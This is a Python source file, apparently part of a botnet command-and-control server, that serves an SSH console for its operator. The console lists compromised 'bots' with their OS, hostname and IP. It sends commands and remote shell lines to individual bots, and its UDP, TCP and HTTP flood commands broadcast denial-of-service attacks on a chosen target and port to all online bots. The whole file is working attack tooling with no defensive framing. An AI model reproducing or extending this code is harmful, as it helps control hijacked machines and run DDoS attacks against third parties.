import asyncio
import json
import logging

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text

logger = logging.getLogger(__name__)


def _ts_to_str(ts) -> str:
    if ts is None:
        return "N/A"
    from datetime import datetime

    return datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")


async def start_ssh_server(
    host: str,
    port: int,
    password: str,
    db,
    cmd_queue,
):
    """Khởi động asyncssh server tích hợp với asyncio loop."""
    try:
        import asyncssh
    except ImportError:
        logger.error("asyncssh not installed. Install with: pip install asyncssh")
        return

    from server.cli_handler import CLICommandHandler

    handler = CLICommandHandler(db, cmd_queue)

    class _SSHServer(asyncssh.SSHServer):
        def connection_made(self, conn):
            self._conn = conn

        def begin_auth(self, username):
            return True

        def password_auth_supported(self):
            return True

        def validate_password(self, username, pwd):
            return pwd == password

        def session_requested(self):
            return True

    class _FlushWriter:
        """Wrapper thêm no-op flush() cho SSH stdout để Rich Console hoạt động."""
        def __init__(self, writer):
            self._w = writer

        def write(self, data):
            return self._w.write(data)

        def flush(self):
            pass

    async def _handle_session(stdin, stdout, stderr):
        flushable = _FlushWriter(stdout)
        console = Console(file=flushable, force_terminal=True, width=120)

        console.print("[bold cyan]CNC CLI[/bold cyan] — type [bold]help[/bold] for commands, [bold]exit[/bold] to quit")

        while True:
            console.print("[cyan][CNC]>[/cyan] ", end="")
            line = await stdin.readline()
            if not line:
                break
            line = line.strip()
            if not line:
                continue

            parts = line.split()
            cmd_name = parts[0].lower()

            if cmd_name in ("exit", "quit", "q"):
                break

            elif cmd_name == "help":
                _print_help(console)

            elif cmd_name == "bots":
                if len(parts) >= 2 and parts[1] == "count":
                    resp = await handler.handle_action("bots_count", {})
                    _print_bots_count(console, resp)
                else:
                    resp = await handler.handle_action("bots_list", {})
                    _print_bots_list(console, resp)

            elif cmd_name == "bot" and len(parts) >= 3 and parts[1] == "info":
                resp = await handler.handle_action("bot_info", {"bot_id": parts[2]})
                _print_bot_info(console, resp)

            elif cmd_name == "cmd" and len(parts) >= 4 and parts[1] == "status":
                resp = await handler.handle_action("cmd_status", {"cmd_id": parts[2]})
                _print_cmd_status(console, resp)

            elif cmd_name == "cmd" and len(parts) >= 4:
                params = _parse_params(parts[3:])
                resp = await handler.handle_action(
                    "cmd_send",
                    {"bot_id": parts[1], "module": parts[2], "params": params},
                )
                _print_cmd_send(console, resp)

            elif cmd_name == "ping":
                resp = await handler.handle_action("ping", {})
                _print_ping(console, resp)

            elif cmd_name in ("udp-attack", "tcp-attack", "http-attack"):
                if len(parts) < 3:
                    console.print(f"[yellow]Usage:[/yellow] {cmd_name} <target> <port> [threads=N] [duration=S] [size=B]")
                    continue
                atk_type = cmd_name.split("-")[0]
                params = {"type": atk_type, "target": parts[1], "port": parts[2]}
                for extra in parts[3:]:
                    if "=" in extra:
                        k, v = extra.split("=", 1)
                        params[k] = v
                    else:
                        params[f"arg{len(params)}"] = extra
                resp = await handler.handle_action(
                    "cmd_broadcast", {"module": "flood", "params": params}
                )
                _print_broadcast(console, resp, "flood")

            elif cmd_name == "shell" and len(parts) >= 3:
                resp = await handler.handle_action(
                    "cmd_send",
                    {"bot_id": parts[1], "module": "shell", "params": {"cmd": " ".join(parts[2:])}},
                )
                _print_cmd_send(console, resp)

            else:
                console.print(f"[yellow]Unknown command:[/yellow] {cmd_name}. Type [bold]help[/bold] for available commands.")

        stdout.close()

    try:
        server_key = asyncssh.generate_private_key("ssh-rsa")
        await asyncssh.listen(
            host,
            port,
            server_host_keys=[server_key],
            server_factory=lambda: _SSHServer(),
            session_factory=lambda stdin, stdout, stderr: _handle_session(
                stdin, stdout, stderr
            ),
        )
        logger.info("SSH CLI server listening on %s:%s", host, port)
        await asyncio.Event().wait()
    except asyncio.CancelledError:
        pass
    except Exception:
        logger.exception("SSH server error")


def _parse_params(args: list[str]) -> dict:
    params = {}
    for a in args:
        if "=" in a:
            k, v = a.split("=", 1)
            params[k] = v
        else:
            params[f"arg{len(params)}"] = a
    return params


def _print_help(console: Console):
    from rich.markdown import Markdown

    help_md = """\
# CNC Commands

## Monitoring
- **bots list** — List all connected bots
- **bots count** — Show bot statistics (total/online/offline)
- **bot info** `<id>` — Show detailed info for one bot
- **ping** — Check if CNC server is online

## Command Dispatch
- **cmd** `<bot_id>` `<module>` `[key=val ...]` — Send command to one bot
- **cmd status** `<cmd_id>` — Check command result

## Broadcast Attacks (all online bots)
- **udp-attack** `<target>` `<port>` `[threads=N]` `[duration=S]` `[size=B]`
- **tcp-attack** `<target>` `<port>` `[threads=N]` `[duration=S]` `[size=B]`
- **http-attack** `<target>` `<port>` `[threads=N]` `[duration=S]`

## Single Bot
- **shell** `<bot_id>` `<command>` — Execute shell on one bot

## Utility
- **help** — This help
- **exit** — Quit
"""
    console.print(Markdown(help_md))


def _print_bots_list(console: Console, resp: dict):
    if not resp.get("ok"):
        console.print(f"[bold red]Error:[/bold red] {resp.get('error')}")
        return

    bots = resp.get("data", [])
    if not bots:
        console.print("[dim](no bots connected)[/dim]")
        return

    table = Table(title="Bot List", title_style="bold cyan", border_style="blue")
    table.add_column("ID", style="dim", width=5)
    table.add_column("OS", width=22)
    table.add_column("Arch", width=10)
    table.add_column("Hostname", width=20)
    table.add_column("IP", width=18)
    table.add_column("Status", width=8)

    for b in bots:
        os_str = f"{b.get('os', '')} {b.get('os_version', '')}".strip()
        status = b.get("status", "")
        status_style = "[green]online[/green]" if status == "online" else "[red]offline[/red]"
        table.add_row(
            str(b["id"]),
            os_str,
            b.get("arch", ""),
            b.get("hostname", ""),
            b.get("ip", ""),
            status_style,
        )

    console.print(table)


def _print_bots_count(console: Console, resp: dict):
    if not resp.get("ok"):
        console.print(f"[bold red]Error:[/bold red] {resp.get('error')}")
        return

    d = resp["data"]
    text = Text()
    text.append("Total: ", style="bold")
    text.append(f"{d['total']}  ")
    text.append("Online: ", style="bold green")
    text.append(f"{d['online']}  ")
    text.append("Offline: ", style="bold red")
    text.append(f"{d['offline']}")

    console.print(Panel(text, title="Bot Statistics", border_style="blue"))

    if d.get("by_os"):
        os_table = Table(show_header=False, box=None, padding=(0, 2))
        for os_name, count in d["by_os"]:
            os_table.add_row(f"[cyan]{os_name}[/cyan]", f"[bold]{count}[/bold]")
        console.print(os_table)


def _print_bot_info(console: Console, resp: dict):
    if not resp.get("ok"):
        console.print(f"[bold red]Error:[/bold red] {resp.get('error')}")
        return

    b = resp["data"]
    status = b.get("status", "")
    status_style = "[green]online[/green]" if status == "online" else "[red]offline[/red]"

    info = Text()
    info.append(f"  Bot ID:      {b['bot_id']}\n")
    info.append(f"  OS:          {b.get('os', '')} {b.get('os_version', '')}\n".replace("\n", "").strip())
    info.append("\n")
    info.append(f"  Arch:        {b.get('arch', '')}\n")
    info.append(f"  Kernel:      {b.get('kernel', '')}\n")
    info.append(f"  Hostname:    {b.get('hostname', '')}\n")
    info.append(f"  IP:          {b.get('ip', '')}\n")
    info.append(f"  Status:      {status_style}\n")
    info.append(f"  Session:     {b.get('session_id', '')}\n")
    info.append(f"  First seen:  {_ts_to_str(b.get('first_seen'))}\n")
    info.append(f"  Last seen:   {_ts_to_str(b.get('last_seen'))}\n")

    console.print(Panel(info, title=f"Bot #{b['id']}", border_style="blue"))


def _print_cmd_send(console: Console, resp: dict):
    if resp.get("ok"):
        console.print(f"[bold green]Command queued:[/bold green] [cyan]{resp['cmd_id']}[/cyan]")
    else:
        console.print(f"[bold red]Error:[/bold red] {resp.get('error')}")


def _print_cmd_status(console: Console, resp: dict):
    if not resp.get("ok"):
        console.print(f"[bold red]Error:[/bold red] {resp.get('error')}")
        return

    c = resp["data"]
    exit_code = c.get("exit_code", -1)
    exit_style = "[green]" if exit_code == 0 else "[yellow]" if exit_code == -1 else "[red]"

    info = Text()
    info.append(f"  Cmd ID:    {c['id']}\n")
    info.append(f"  Bot:       {c['bot_id']}\n")
    info.append(f"  Module:    {c['module']}\n")
    info.append(f"  Params:    {json.dumps(c['params'])}\n")
    info.append(f"  Exit code: {exit_style}{exit_code}[/]\n")
    info.append(f"  Created:   {_ts_to_str(c.get('created_at'))}\n")
    info.append(f"  Completed: {_ts_to_str(c.get('completed_at'))}\n")

    console.print(Panel(info, title=f"Command {c['id']}", border_style="blue"))

    output = c.get("output", "")
    if output:
        console.print(Panel(output.strip(), title="Output", border_style="green"))
    else:
        console.print("[dim](no output yet)[/dim]")


def _print_ping(console: Console, resp: dict):
    if resp.get("ok"):
        console.print("[bold green]CNC server: ONLINE[/bold green]")
    else:
        console.print("[bold red]CNC server: ERROR[/bold red]")


def _print_broadcast(console: Console, resp: dict, module: str):
    if not resp.get("ok"):
        console.print(f"[bold red]Error:[/bold red] {resp.get('error')}")
        return

    count = resp.get("sent_to", 0)
    if count > 0:
        console.print(
            f"[bold green]Broadcast[/bold green] '[cyan]{module}[/cyan]' "
            f"to [bold]{count}[/bold] bot(s)"
        )
    else:
        console.print(f"[yellow]Broadcast: no online bots to receive '{module}'[/yellow]")
